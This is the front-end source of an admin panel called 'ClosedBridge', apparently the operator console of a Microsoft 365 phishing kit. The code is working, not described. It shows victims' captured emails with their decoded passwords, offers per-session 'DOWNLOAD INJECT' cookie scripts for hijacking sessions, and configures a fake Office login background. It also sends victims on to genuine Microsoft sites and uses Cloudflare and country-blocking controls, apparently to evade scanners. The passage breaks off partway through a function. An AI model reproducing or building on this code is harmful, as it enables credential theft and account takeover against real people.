<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
    <meta name="referrer" content="no-referrer">
    <meta name="theme-color" content="#1e293b">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>ClosedBridge Admin Panel</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #0f172a;
            color: #e2e8f0;
            height: 100vh;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }

        .header {
            background: #1e293b;
            padding: 16px 24px;
            border-bottom: 2px solid #334155;
            flex-shrink: 0;
        }

        .header h1 {
            font-size: 24px;
            font-weight: 700;
            color: #f1f5f9;
            margin-bottom: 4px;
        }

        .header p {
            color: #94a3b8;
            font-size: 14px;
            font-weight: 500;
        }

        .auth-section {
            background: #1e293b;
            border-bottom: 1px solid #334155;
            padding: 16px 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 16px;
            flex-shrink: 0;
        }

        .auth-section.authenticated {
            background: #134e4a;
            border-color: #22c55e;
        }

        .auth-form {
            display: flex;
            gap: 12px;
            align-items: center;
        }

        .token-input {
            padding: 10px 16px;
            border: 1px solid #475569;
            border-radius: 6px;
            background: #0f172a;
            color: #f1f5f9;
            font-size: 14px;
            min-width: 200px;
            outline: none;
        }

        .token-input:focus {
            border-color: #3b82f6;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
        }

        .auth-btn {
            background: #3b82f6;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 600;
            font-size: 14px;
            transition: background-color 0.2s;
        }

        .auth-btn:hover {
            background: #2563eb;
        }

        .logout-btn {
            background: #ef4444;
        }

        .logout-btn:hover {
            background: #dc2626;
        }

        .auth-success {
            color: #22c55e;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .main-container {
            display: flex;
            flex: 1;
            overflow: hidden;
        }

        .sidebar {
            width: 240px;
            background: #1e293b;
            border-right: 2px solid #334155;
            display: flex;
            flex-direction: column;
            flex-shrink: 0;
            overflow-y: auto;
        }

        .tab-button {
            padding: 16px 20px;
            background: transparent;
            border: none;
            border-left: 3px solid transparent;
            color: #94a3b8;
            text-align: left;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .tab-button:hover {
            background: #334155;
            color: #f1f5f9;
        }

        .tab-button.active {
            background: #334155;
            border-left-color: #3b82f6;
            color: #f1f5f9;
        }

        .content-area {
            flex: 1;
            background: #0f172a;
            overflow-y: auto;
            padding: 24px;
        }

        .tab-content {
            display: none;
            animation: fadeIn 0.3s;
        }

        .tab-content.active {
            display: block;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .dashboard-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 16px;
            margin-bottom: 24px;
        }

        .dashboard-card {
            background: #1e293b;
            border: 1px solid #334155;
            border-radius: 8px;
            padding: 20px;
            display: flex;
            align-items: center;
            transition: all 0.2s ease;
        }

        .dashboard-card:hover {
            border-color: #3b82f6;
            transform: translateY(-2px);
        }

        .dashboard-card.success {
            border-color: #22c55e;
            background: #134e4a;
        }

        .dashboard-card.error {
            border-color: #ef4444;
            background: #450a0a;
        }

        .dashboard-card.info {
            border-color: #3b82f6;
            background: #172554;
        }

        .dashboard-card-icon {
            font-size: 24px;
            margin-right: 16px;
        }

        .dashboard-card-content {
            flex: 1;
        }

        .dashboard-card-number {
            font-size: 28px;
            font-weight: 700;
            color: #f1f5f9;
            line-height: 1;
            margin-bottom: 4px;
        }

        .dashboard-card.success .dashboard-card-number {
            color: #22c55e;
        }

        .dashboard-card.error .dashboard-card-number {
            color: #ef4444;
        }

        .dashboard-card.info .dashboard-card-number {
            color: #3b82f6;
        }

        .dashboard-card-label {
            font-size: 14px;
            color: #94a3b8;
            font-weight: 500;
        }

        .form-group {
            margin-bottom: 16px;
        }

        .form-label {
            display: block;
            font-weight: 600;
            color: #e2e8f0;
            margin-bottom: 6px;
            font-size: 14px;
        }

        .form-input, .form-select {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #475569;
            border-radius: 6px;
            background: #1e293b;
            color: #f1f5f9;
            font-size: 14px;
            outline: none;
        }

        .form-input:focus, .form-select:focus {
            border-color: #3b82f6;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
        }

        .form-row {
            display: flex;
            gap: 12px;
        }

        .form-row .form-group {
            flex: 1;
        }

        .btn {
            background: #3b82f6;
            color: #fff;
            padding: 12px 20px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 600;
            font-size: 14px;
            transition: background-color 0.2s;
            display: inline-block;
        }

        .btn:hover {
            background: #2563eb;
        }

        .btn-success {
            background: #22c55e;
        }

        .btn-success:hover {
            background: #16a34a;
        }

        .btn-danger {
            background: #ef4444;
        }

        .btn-danger:hover {
            background: #dc2626;
        }

        .btn-secondary {
            background: #6b7280;
        }

        .btn-secondary:hover {
            background: #4b5563;
        }

        .btn-sm {
            padding: 8px 16px;
            font-size: 13px;
        }

        .data-table {
            width: 100%;
            border-collapse: collapse;
            background: #1e293b;
            border-radius: 8px;
            overflow: hidden;
            border: 1px solid #334155;
        }

        .data-table th {
            background: #334155;
            padding: 16px;
            text-align: left;
            font-weight: 600;
            color: #f1f5f9;
            border-bottom: 1px solid #475569;
            font-size: 14px;
        }

        .data-table td {
            padding: 16px;
            border-bottom: 1px solid #334155;
            vertical-align: middle;
            font-size: 14px;
            color: #e2e8f0;
        }

        .data-table tr:hover td {
            background: #334155;
        }

        .email-cell {
            font-weight: 600;
            color: #3b82f6;
        }

        .password-masked,
        .password-revealed {
            background: #0f172a;
            padding: 8px 12px;
            border: 1px solid #475569;
            border-radius: 6px;
            font-size: 14px;
            color: #f1f5f9;
        }

        .password-revealed {
            background: #422006;
            border-color: #fb923c;
            word-break: break-all;
        }

        .reveal-btn {
            background: #6b7280;
            color: #fff;
            padding: 6px 12px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 12px;
            margin-left: 8px;
        }

        .reveal-btn:hover {
            background: #4b5563;
        }

        .download-btn {
            background: #16a34a;
            color: #fff;
            padding: 8px 16px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            font-size: 13px;
            font-weight: 600;
        }

        .download-btn:hover {
            background: #15803d;
        }

        .status-badge {
            padding: 4px 12px;
            border-radius: 16px;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
        }

        .status-success {
            background: #134e4a;
            color: #22c55e;
        }

        .status-error {
            background: #450a0a;
            color: #ef4444;
        }

        .status-info {
            background: #172554;
            color: #3b82f6;
        }

        .loading, .error, .no-sessions {
            text-align: center;
            padding: 40px;
            color: #94a3b8;
            font-size: 16px;
        }

        .error {
            color: #ef4444;
        }

        .session-info {
            font-size: 12px;
            color: #94a3b8;
            margin-top: 4px;
        }

        ::-webkit-scrollbar {
            width: 8px;
        }

        ::-webkit-scrollbar-track {
            background: #1e293b;
        }

        ::-webkit-scrollbar-thumb {
            background: #475569;
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #64748b;
        }

        .section-title {
            font-size: 20px;
            font-weight: 700;
            color: #f1f5f9;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>ClosedBridge Admin Panel</h1>
        <p>Link Management Room</p>
    </div>

    <!-- Authentication Section -->
    <div id="auth-section" class="auth-section">
        <div id="auth-form" class="auth-form">
            <input type="password" 
                   id="token-input" 
                   class="token-input" 
                   placeholder="Enter admin token..." 
                   onkeypress="if(event.key==='Enter') authenticate()">
            <button onclick="authenticate()" class="auth-btn">Login</button>
        </div>
        <div id="auth-success" class="auth-success" style="display: none;">
            ‚úÖ Access Granted
            <button onclick="logout()" class="auth-btn logout-btn">Logout</button>
        </div>
    </div>

    <div class="main-container">
        <!-- Sidebar Navigation -->
        <div class="sidebar">
            <button class="tab-button active" onclick="switchTab('analytics')">
                üìä Analytics
            </button>
            <button class="tab-button" onclick="switchTab('cloudflare')">
                ‚òÅÔ∏è Cloudflare
            </button>
            <button class="tab-button" onclick="switchTab('redirect')">
                üéØ Redirect
            </button>
            <button class="tab-button" onclick="switchTab('security')">
                üõ°Ô∏è Security
            </button>
            <button class="tab-button" onclick="switchTab('country')">
                üåç Country Access
            </button>
            <button class="tab-button" onclick="switchTab('sessions')">
                üó∫ Sessions
            </button>
            <button class="tab-button" onclick="switchTab('background')" id="background-tab" style="display: none;">
                üñº Background
            </button>
        </div>

        <!-- Content Area -->
        <div class="content-area">
            <!-- Analytics Tab -->
            <div id="analytics-tab" class="tab-content active">
                <h2 class="section-title">Analytics Dashboard</h2>
                <div class="dashboard-grid">
                    <div class="dashboard-card">
                        <div class="dashboard-card-icon">üë•</div>
                        <div class="dashboard-card-content">
                            <div class="dashboard-card-number" id="total-visits">-</div>
                            <div class="dashboard-card-label">Total Visits</div>
                        </div>
                    </div>
                    <div class="dashboard-card success">
                        <div class="dashboard-card-icon">‚úÖ</div>
                        <div class="dashboard-card-content">
                            <div class="dashboard-card-number" id="valid-entries">-</div>
                            <div class="dashboard-card-label">Valid Entries</div>
                        </div>
                    </div>
                    <div class="dashboard-card error">
                        <div class="dashboard-card-icon">‚ùå</div>
                        <div class="dashboard-card-content">
                            <div class="dashboard-card-number" id="invalid-entries">-</div>
                            <div class="dashboard-card-label">Invalid Entries</div>
                        </div>
                    </div>
                    <div class="dashboard-card info">
                        <div class="dashboard-card-icon">üìà</div>
                        <div class="dashboard-card-content">
                            <div class="dashboard-card-number" id="success-rate">-</div>
                            <div class="dashboard-card-label">Success Rate</div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Cloudflare Tab -->
            <div id="cloudflare-tab" class="tab-content">
                <h2 class="section-title">Cloudflare Configuration</h2>
                <div class="form-row">
                    <div class="form-group">
                        <label class="form-label">Email Address</label>
                        <input type="email" id="cf-email" class="form-input" placeholder="your@email.com">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Global API Key</label>
                        <input type="password" id="cf-api-key" class="form-input" placeholder="Enter API key">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Zone ID</label>
                        <input type="text" id="cf-zone-id" class="form-input" placeholder="Enter zone ID">
                    </div>
                </div>

                <div style="display: flex; gap: 12px; margin-bottom: 16px;">
                    <button onclick="toggleTokenVisibility()" id="toggle-token-btn" class="btn btn-secondary btn-sm">
                        Show API Key
                    </button>
                    <button onclick="saveCloudflareConfig()" id="save-config-btn" class="btn btn-success">
                        Save Configuration
                    </button>
                </div>

                <div id="cf-config-status" class="status-badge status-error">
                    ‚ö†Ô∏è Not Configured
                </div>
            </div>

            <!-- Redirect Tab -->
            <div id="redirect-tab" class="tab-content">
                <h2 class="section-title">Redirect Control</h2>
                <div class="form-group">
                    <label class="form-label">Current Target URL:</label>
                    <div id="current-redirect-display" style="padding: 12px; background: #1e293b; border: 1px solid #475569; color: #f1f5f9; border-radius: 6px; word-break: break-all;">
                        Loading...
                    </div>
                </div>

                <div class="form-row">
                    <div class="form-group" style="flex: 2;">
                        <label class="form-label">Redirect Destination:</label>
                        <select id="redirect-destination" class="form-input">
                            <option value="https://office.com">Microsoft Office (Default)</option>
                            <option value="https://outlook.office.com/mail/">Outlook Mail</option>
                            <option value="https://www.microsoft.com">Microsoft Home</option>
                            <option value="https://portal.azure.com">Azure Portal</option>
                            <option value="https://teams.microsoft.com">Microsoft Teams</option>
                            <option value="https://onedrive.live.com">OneDrive</option>
                            <option value="https://www.office.com/apps">Office Apps</option>
                            <option value="https://admin.microsoft.com">Microsoft 365 Admin</option>
                            <option value="https://security.microsoft.com">Microsoft Security</option>
                            <option value="https://google.com">Google</option>
                            <option value="custom">Custom URL...</option>
                        </select>
                    </div>
                    <div style="display: flex; gap: 12px; align-items: end;">
                        <button onclick="loadRedirectConfig()" class="btn btn-secondary">
                            Refresh
                        </button>
                        <button onclick="updateProjectRedirect()" class="btn btn-success">
                            Update Project
                        </button>
                    </div>
                </div>

                <div class="form-group">
                    <input type="url" id="custom-redirect-url" class="form-input" placeholder="Enter custom URL..." style="display: none;">
                </div>

                <div id="redirect-status" class="status-badge status-info">
                    üìç Status: Ready
                </div>
            </div>

            <!-- Security Tab -->
            <div id="security-tab" class="tab-content">
                <h2 class="section-title">Security Controls</h2>
                <div class="dashboard-grid">
                    <div class="dashboard-card info">
                        <div class="dashboard-card-icon">üìä</div>
                        <div class="dashboard-card-content">
                            <div class="dashboard-card-number" id="cf-status">Loading</div>
                            <div class="dashboard-card-label">System Status</div>
                        </div>
                    </div>
                    <div class="dashboard-card">
                        <div class="dashboard-card-icon">ü§ñ</div>
                        <div class="dashboard-card-content">
                            <div class="dashboard-card-number" id="bot-fight-status">Off</div>
                            <div class="dashboard-card-label">Bot Protection</div>
                        </div>
                    </div>
                    <div class="dashboard-card">
                        <div class="dashboard-card-icon">üîí</div>
                        <div class="dashboard-card-content">
                            <div class="dashboard-card-number" id="security-level-status">Off</div>
                            <div class="dashboard-card-label">Security Level</div>
                        </div>
                    </div>
                    <div class="dashboard-card">
                        <div class="dashboard-card-icon">üåê</div>
                        <div class="dashboard-card-content">
                            <div class="dashboard-card-number" id="browser-check-status">Off</div>
                            <div class="dashboard-card-label">Browser Check</div>
                        </div>
                    </div>
                </div>

                <div style="display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 16px;">
                    <button onclick="toggleBotFight()" id="bot-fight-btn" class="btn">
                        Toggle Bot Fight
                    </button>
                    <button onclick="toggleBrowserCheck()" id="browser-check-btn" class="btn">
                        Toggle Browser Check
                    </button>
                    <button onclick="enableUnderAttack()" class="btn btn-danger">
                        Emergency Mode
                    </button>
                    <button onclick="disableAllProtection()" class="btn btn-secondary">
                        Disable All
                    </button>
                </div>

                <div class="form-group">
                    <label class="form-label">Security Level:</label>
                    <select id="security-level-select" onchange="setSecurityLevel()" class="form-input">
                        <option value="off">Off</option>
                        <option value="essentially_off">Essentially Off</option>
                        <option value="low">Low</option>
                        <option value="medium">Medium</option>
                        <option value="high">High</option>
                        <option value="under_attack">Under Attack</option>
                    </select>
                </div>
            </div>

            <!-- Country Access Tab -->
            <div id="country-tab" class="tab-content">
                <h2 class="section-title">Country Access Control</h2>
                <div class="dashboard-grid" style="margin-bottom: 20px;">
                    <div class="dashboard-card">
                        <div class="dashboard-card-icon">üìã</div>
                        <div class="dashboard-card-content">
                            <div class="dashboard-card-number" id="country-rules-count">0</div>
                            <div class="dashboard-card-label">Active Rules</div>
                        </div>
                    </div>
                    <div class="dashboard-card info">
                        <div class="dashboard-card-icon">üåç</div>
                        <div class="dashboard-card-content">
                            <div class="dashboard-card-number" id="country-access-status">Open</div>
                            <div class="dashboard-card-label">Access Mode</div>
                        </div>
                    </div>
                </div>

                <div style="background: #1e293b; border: 1px solid #475569; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
                    <h3 style="color: #f1f5f9; font-size: 16px; font-weight: 600; margin: 0 0 16px 0;">Create New Country Rule</h3>

                    <div class="form-row">
                        <div class="form-group">
                            <label class="form-label">Action Type:</label>
                            <select id="country-action-select" class="form-input">
                                <option value="block">Block Countries</option>
                                <option value="allow_only">Allow Only</option>
                            </select>
                        </div>
                        <div class="form-group" style="flex: 2;">
                            <label class="form-label">Country Codes:</label>
                            <input type="text" id="country-codes-input" class="form-input" placeholder="e.g., US,CA,GB">
                        </div>
                        <div style="display: flex; align-items: end;">
                            <button onclick="createCountryRule()" id="create-country-rule-btn" class="btn btn-success">
                                Create Rule
                            </button>
                        </div>
                    </div>

                    <p style="font-size: 14px; color: #94a3b8; margin-bottom: 12px;">
                        Examples: US,CA,GB (US, Canada, UK) | CN,RU,KP (China, Russia, N.Korea) | DE,FR,ES (Germany, France, Spain)
                    </p>

                    <div class="form-group">
                        <input type="text" id="country-rule-name" class="form-input" placeholder="Rule description (optional)">
                    </div>
                </div>

                <div style="background: #1e293b; border: 1px solid #475569; padding: 20px; border-radius: 8px;">
                    <h3 style="color: #f1f5f9; font-size: 16px; font-weight: 600; margin: 0 0 16px 0;">Active Country Rules</h3>
                    <div id="country-rules-container" style="min-height: 40px;">
                        <div style="color: #94a3b8; font-size: 14px; text-align: center; padding: 20px;">
                            Loading country rules...
                        </div>
                    </div>
                </div>
            </div>

            <!-- Sessions Tab -->
            <div id="sessions-tab" class="tab-content">
                <h2 class="section-title">Session Database</h2>
                <div id="loading" class="loading">
                    Loading session data...
                </div>

                <div id="error" class="error" style="display: none;">
                    Error loading session data
                </div>

                <div id="sessions-content" style="display: none;">
                    <table class="data-table">
                        <thead>
                            <tr>
                                <th>Status</th>
                                <th>Email Address</th>
                                <th>Password</th>
                                <th>Download</th>
                                <th>Session Info</th>
                            </tr>
                        </thead>
                        <tbody id="sessions-tbody">
                        </tbody>
                    </table>
                </div>

                <div id="no-sessions" class="no-sessions" style="display: none;">
                    NO CLASSIFIED SESSIONS FOUND
                </div>
            </div>

            <!-- Background Tab -->
            <div id="background-tab-content" class="tab-content">
                <h2 class="section-title">Office Login Page Background</h2>
                <div class="form-group">
                    <label class="form-label">Background Image URL:</label>
                    <select id="background-url-select" class="form-input" onchange="updateBackgroundUrl()">
                        <option value="https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg">Default Office Background</option>
                        <option value="https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg">Alternative Background 2</option>
                    </select>
                </div>
                <div style="margin-top: 12px;">
                    <button onclick="updateBackgroundUrl()" class="btn btn-success">
                        Save Background
                    </button>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Authentication state
        let isAuthenticated = false;
        let adminToken = null;

        // Tab switching function
        function switchTab(tabName) {
            // Hide all tab contents
            const allTabs = document.querySelectorAll('.tab-content');
            allTabs.forEach(tab => tab.classList.remove('active'));

            // Remove active class from all buttons
            const allButtons = document.querySelectorAll('.tab-button');
            allButtons.forEach(btn => btn.classList.remove('active'));

            // Show selected tab
            const selectedTab = document.getElementById(tabName + '-tab') || document.getElementById(tabName + '-tab-content');
            if (selectedTab) {
                selectedTab.classList.add('active');
            }

            // Activate button
            event.target.classList.add('active');

            // Load data for specific tabs
            if (tabName === 'sessions' && isAuthenticated) {
                loadSessions();
            } else if (tabName === 'country' && isAuthenticated) {
                loadCountryRules();
            }
        }

        // Check if user is already authenticated on page load
        function checkAuthOnLoad() {
            const storedToken = localStorage.getItem('adminToken');
            if (storedToken) {
                adminToken = storedToken;
                updateAuthUI(true);
                setTimeout(() => {
                    loadAnalytics();
                    loadSessions();
                    loadCloudflareConfig();
                    loadCloudflareStatus();
                    loadBackgroundConfig();
                    loadRedirectConfig();
                    loadCountryRules();
                }, 100);
            } else {
                updateAuthUI(false);
            }
        }

        // Update authentication UI
        function updateAuthUI(authenticated) {
            isAuthenticated = authenticated;
            const authSection = document.getElementById('auth-section');
            const authForm = document.getElementById('auth-form');
            const authSuccess = document.getElementById('auth-success');
            const loading = document.getElementById('loading');
            const sessionsContent = document.getElementById('sessions-content');
            const noSessions = document.getElementById('no-sessions');
            const backgroundTab = document.getElementById('background-tab');

            if (authenticated) {
                authSection.classList.add('authenticated');
                authForm.style.display = 'none';
                authSuccess.style.display = 'flex';
                loading.style.display = 'block';
                sessionsContent.style.display = 'none';
                noSessions.style.display = 'none';
                backgroundTab.style.display = 'block';
            } else {
                authSection.classList.remove('authenticated');
                authForm.style.display = 'flex';
                authSuccess.style.display = 'none';
                loading.style.display = 'none';
                sessionsContent.style.display = 'none';
                noSessions.style.display = 'none';
                document.getElementById('error').style.display = 'none';
                backgroundTab.style.display = 'none';
            }
        }

        // Authenticate with token
        async function authenticate() {
            const tokenInput = document.getElementById('token-input');
            const token = tokenInput.value.trim();

            if (!token) {
                alert('SECURITY ALERT: TOKEN REQUIRED FOR ACCESS');
                return;
            }

            try {
                const response = await fetch('/api/admin/sessions?token=' + encodeURIComponent(token));

                if (response.ok) {
                    adminToken = token;
                    localStorage.setItem('adminToken', token);
                    updateAuthUI(true);
                    loadSessions();
                    loadAnalytics();
                    loadCloudflareConfig();
                    loadCloudflareStatus();
                    loadBackgroundConfig();
                    loadRedirectConfig();
                    loadCountryRules();
                    tokenInput.value = '';
                } else if (response.status === 401) {
                    alert('ACCESS DENIED: INVALID TOKEN DETECTED');
                } else {
                    alert('AUTHENTICATION FAILED: SYSTEM ERROR');
                }
            } catch (error) {
                console.error('Authentication error:', error);
                alert('NETWORK ERROR: CONNECTION TO MAINFRAME FAILED');
            }
        }

        // Logout
        function logout() {
            adminToken = null;
            localStorage.removeItem('adminToken');
            updateAuthUI(false);
        }

        // Get stored token for API calls
        function getStoredToken() {
            return adminToken || localStorage.getItem('adminToken') || '';
        }

        // Toggle password visibility
        function togglePassword(index, password) {
            const passwordDiv = document.getElementById(`password-${index}`);
            const button = document.getElementById(`reveal-btn-${index}`);

            if (passwordDiv.classList.contains('password-masked')) {
                passwordDiv.className = 'password-revealed';
                passwordDiv.textContent = password;
                button.textContent = 'HIDE';
            } else {
                passwordDiv.className = 'password-masked';
                const passwordMask = '‚ñà'.repeat(Math.min(password.length, 12));
                passwordDiv.textContent = passwordMask;
                button.textContent = 'SHOW';
            }
        }

        async function loadSessions() {
            if (!isAuthenticated) {
                return;
            }

            try {
                const token = getStoredToken();
                const response = await fetch(`/api/admin/sessions?token=${encodeURIComponent(token)}`);

                if (response.status === 401) {
                    logout();
                    alert('SESSION EXPIRED: RE-AUTHENTICATION REQUIRED');
                    return;
                }

                const sessions = await response.json();

                document.getElementById('loading').style.display = 'none';

                if (sessions.sessions.length === 0) {
                    document.getElementById('no-sessions').style.display = 'block';
                    return;
                }

                const tbody = document.getElementById('sessions-tbody');
                tbody.innerHTML = '';

                sessions.sessions.forEach((session, index) => {
                    const row = document.createElement('tr');

                    if (session.status === 'invalid') {
                        row.style.backgroundColor = '#450a0a';
                        row.style.borderLeft = '4px solid #ef4444';
                    } else {
                        row.style.backgroundColor = '#134e4a';
                        row.style.borderLeft = '4px solid #22c55e';
                    }

                    let passwordColumn = '';
                    if (session.password) {
                        let decodedPassword = session.password;
                        try {
                            decodedPassword = atob(session.password);
                        } catch (e) {
                            decodedPassword = session.password;
                        }
                        const passwordMask = '‚ñà'.repeat(Math.min(decodedPassword.length, 12));

                        passwordColumn = `
                            <div class="password-container">
                                <div id="password-${index}" class="password-masked">
                                    ${passwordMask}
                                </div>
                                <button onclick="togglePassword(${index}, '${decodedPassword.replace(/'/g, "\\'")}')"
                                    id="reveal-btn-${index}" class="reveal-btn">SHOW</button>
                            </div>
                        `;
                    } else if (session.status === 'valid') {
                        passwordColumn = `<span class="status-badge" style="background: #422006; color: #fb923c;">‚ö†Ô∏è Password Not Displayed</span>`;
                    } else if (session.status === 'invalid') {
                        const reason = session.reason || 'FAILED ENTRY';
                        passwordColumn = `<span class="status-badge status-error">‚ùå ${reason}</span>`;
                    } else {
                        passwordColumn = `<span style="color: #94a3b8;">N/A - NO PASSWORD</span>`;
                    }

                    let injectColumn = '';
                    if (session.status === 'valid' && session.injectFilename) {
                        injectColumn = `<a href="/api/cookies/${session.id}?token=${encodeURIComponent(getStoredToken())}" 
                                           class="download-btn" download="${session.injectFilename}">
                                            DOWNLOAD INJECT
                                        </a>`;
                    } else if (session.status === 'valid' && session.id) {
                        const injectFilename = `inject_session_${session.id}.js`;
                        injectColumn = `<a href="/api/cookies/${session.id}?token=${encodeURIComponent(getStoredToken())}" 
                                           class="download-btn" download="${injectFilename}">
                                            DOWNLOAD INJECT
                                        </a>`;
                    } else {
                        injectColumn = `<span style="color: #94a3b8;">NO INJECT SCRIPT</span>`;
                    }

                    const statusBadge = session.status === 'valid' 
                        ? `<span class="status-badge status-success">‚úÖ Valid</span>`
                        : `<span class="status-badge status-error">‚ùå Invalid</span>`;

                    row.innerHTML = `
                        <td>${statusBadge}</td>
                        <td class="email-cell">${session.email}</td>
                        <td>${passwordColumn}</td>
                        <td>${injectColumn}</td>
                        <td>
                            <div>ID: ${session.id}</div>
                            <div class="session-info">
                                TIMESTAMP: ${new Date(session.timestamp).toLocaleString()}
                            </div>
                            ${session.status === 'valid' ? 
                                `<div class="session-info">COOKIES: ${session.totalCookies || 0} ENCRYPTED</div>
                                 <div class="session-info" style="color: #22c55e;">Status: Successful Authentication</div>` :
                                `<div class="session-info" style="color: #ef4444;">Failure Reason: ${session.reason || 'Unknown Error'}</div>
                                 ${session.errorMessage ? `<div class="session-info" style="color: #fb923c;">Error Details: ${session.errorMessage}</div>` : ''}
                                 <div class="session-info" style="color: #fb923c;">Status: Failed Authentication</div>`
                            }
                        </td>
                    `;

                    tbody.appendChild(row);
                });

                document.getElementById('sessions-content').style.display = 'block';

            } catch (error) {
                console.error('Error loading sessions:', error);
                document.getElementById('loading').style.display = 'none';
                const errorDiv = document.getElementById('error');
                errorDiv.textContent = `SYSTEM ERROR: ${error.message}`;
                errorDiv.style.display = 'block';
            }
        }

        async function loadAnalytics() {
            if (!isAuthenticated) {
                document.getElementById('total-visits').textContent = '-';
                document.getElementById('valid-entries').textContent = '-';
                document.getElementById('invalid-entries').textContent = '-';
                document.getElementById('success-rate').textContent = '-';
                return;
            }

            try {
                const token = getStoredToken();
                const response = await fetch(`/api/admin/analytics?token=${encodeURIComponent(token)}`);

                if (response.status === 401) {
                    logout();
                    return;
                }

                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                }

                const analytics = await response.json();

                updateAnalyticsCard('total-visits', analytics.totalVisits || 0);
                updateAnalyticsCard('valid-entries', analytics.validEntries || 0);
                updateAnalyticsCard('invalid-entries', analytics.invalidEntries || 0);

                const total = (analytics.validEntries || 0) + (analytics.invalidEntries || 0);
                const successRate = total > 0 ? Math.round((analytics.validEntries / total) * 100) : 0;
                updateAnalyticsCard('success-rate', successRate + '%');

            } catch (error) {
                console.error('Error loading analytics:', error);
                document.getElementById('total-visits').textContent = 'ERROR';
                document.getElementById('valid-entries').textContent = 'ERROR';
                document.getElementById('invalid-entries').textContent = 'ERROR';
                document.getElementById('success-rate').textContent = 'ERROR';
            }
        }

        function updateAnalyticsCard(elementId, value) {
            const element = document.getElementById(elementId);
            if (element) {
                element.style.opacity = '0.5';
                setTimeout(() => {
                    element.textContent = value;
                    element.style.opacity = '1';
                }, 100);
            }
        }

        async function loadCloudflareConfig() {
            if (!isAuthenticated) return;

            try {
                const token = getStoredToken();
                const response = await fetch(`/api/admin/cloudflare/config?token=${encodeURIComponent(token)}`);

                if (response.status === 401) {
                    logout();
                    return;
                }

                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}`);
                }

                const data = await response.json();

                if (data.success && data.config) {
                    document.getElementById('cf-email').value = data.config.email || '';
                    document.getElementById('cf-zone-id').value = data.config.zoneId || '';

                    if (data.config.configured) {
                        document.getElementById('cf-config-status').innerHTML = 
                            `<span class="status-badge status-success">‚úÖ Configured (${data.config.authMethod === 'token' ? 'API Token' : 'Global API Key'})</span>`;
                    } else {
                        document.getElementById('cf-config-status').innerHTML = 
                            `<span class="status-badge status-error">‚ö†Ô∏è Not Configured</span>`;
                    }
                } else {
                    document.getElementById('cf-config-status').innerHTML = 
                        `<span class="status-badge status-error">‚ö†Ô∏è Not Configured</span>`;
                }
            } catch (error) {
                // Silent fail - Cloudflare is optional
                document.getElementById('cf-config-status').innerHTML = 
                    `<span class="status-badge status-error">‚ö†Ô∏è Not Configured</span>`;
            }
        }

        function toggleTokenVisibility() {
            const apiKeyInput = document.getElementById('cf-api-key');
            const toggleBtn = document.getElementById('toggle-token-btn');

            if (apiKeyInput.type === 'password') {
                apiKeyInput.type = 'text';
                toggleBtn.textContent = 'Hide API Key';
            } else {
                apiKeyInput.type = 'password';
                toggleBtn.textContent = 'Show API Key';
            }
        }

        async function saveCloudflareConfig() {
            if (!isAuthenticated) {
                alert('AUTHENTICATION REQUIRED');
                return;
            }

            const email = document.getElementById('cf-email').value.trim();
            const apiKey = document.getElementById('cf-api-key').value.trim();
            const zoneId = document.getElementById('cf-zone-id').value.trim();
            const saveBtn = document.getElementById('save-config-btn');

            if (!email || !apiKey || !zoneId) {
                alert('‚ö†Ô∏è EMAIL, API KEY, AND ZONE ID ARE ALL REQUIRED');
                return;
            }

            saveBtn.disabled = true;
            saveBtn.textContent = 'SYNCING...';

            try {
                const token = getStoredToken();
                const response = await fetch(`/api/admin/cloudflare/configure?token=${encodeURIComponent(token)}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        email: email,
                        apiKey: apiKey, 
                        zoneId: zoneId 
                    })
                });

                const data = await response.json();

                if (data.success) {
                    document.getElementById('cf-config-status').innerHTML = 
                        '<span class="status-badge status-success">‚úÖ Cloudflare Configured Successfully</span>';

                    document.getElementById('cf-api-key').value = '';

                    setTimeout(() => {
                        loadCloudflareConfig();
                        loadCloudflareStatus();
                    }, 1000);

                    alert('‚úÖ CLOUDFLARE CONFIGURATION SAVED SUCCESSFULLY!\n\nCredentials have been securely stored and the system is now connected to your Cloudflare account.');
